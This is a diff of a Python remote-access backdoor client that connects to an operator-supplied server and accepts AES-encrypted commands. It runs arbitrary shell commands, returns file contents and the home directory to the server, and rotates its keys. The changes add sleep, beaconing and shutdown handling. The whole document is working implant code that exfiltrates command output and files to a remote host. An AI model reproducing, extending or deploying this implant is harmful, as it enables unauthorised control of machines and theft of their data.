@@ -1,13 +1,13 @@
 #!/usr/bin/python3
-import socket, sys, os, subprocess, argparse, time, ast, struct
+import socket, sys, os, subprocess, argparse, time, ast, struct, gzip
 from Crypto.Cipher import AES
 parser = argparse.ArgumentParser(description='q*bert says hello')
 parser.add_argument('-p', dest='port', required=True, type=int)
 parser.add_argument('-s', dest='server', required=True)
 args = parser.parse_args()
-aeskey = b'This is a key123'
-aesiv = b'This is an IV456'
-
+aeskey = 'This is a key123'
+aesiv = 'This is an IV456'
+timer = 0
 def do_encrypt(message):
     if isinstance(message, bytes):
         pass
@@ -22,8 +22,7 @@ def do_encrypt(message):
 def do_decrypt(ciphertext):
     obj2 = AES.new(aeskey, AES.MODE_CBC, aesiv)
     message = obj2.decrypt(ciphertext)
-    message = message[:-message[-1]]
-    return message
+    return message[:-message[-1]]
 
 def get_data(conn, buff):
     bs = conn.recv(8)
@@ -50,6 +49,7 @@ def update_aeskeys(command):
     aesiv = command[2]
 
 def main():
+    global timer
     conn=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     buff = 4096
@@ -60,22 +60,28 @@ def main():
             if data == 0:
                 break
             received = str(do_decrypt(data).strip(), 'utf-8')
-            if 'aeskey' in received:
-                command = ast.literal_eval(received)
-                update_aeskeys(command)
-                sendit(conn, do_encrypt('Updated AES key'))
-            else:
-                command = received.split(' ')
-            if 'cmd' in command:
+            command = received.split(' ')
+            if 'sleep' in command:
+                timer = int(command[2])
+                break
+            elif 'goodbye' in command:
+                exit(0)
+            elif 'cmd' in command:
                 del command[0]
                 output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                 sendit(conn, do_encrypt(output.stdout))
             elif 'Arsenal' in command:
                 sendit(conn, do_encrypt('Client initial checkin\nHomedir: %s\n' %os.environ.get('HOME')))
             elif 'get_file' in command:
-                with open(command[1]) as f:
+                with open(command[1], 'rb') as f:
                     tmp = f.read()
-                sendit(conn, do_encrypt(bytes(tmp)))
+                sendit(conn, do_encrypt(tmp))
+            elif 'aeskey' in command:
+                update_aeskeys(command)
+                timer = 1
+                sendit(conn, do_encrypt('Updated AES key'))
+                conn.close()
+                break
         except socket.error as err:
             print("{0}\n".format(err))
     return
@@ -83,3 +89,7 @@ def main():
 if __name__ == '__main__':
     while True:
             main()
+            if timer == 0:
+                exit(0)
+            time.sleep(timer)
+            timer = 0
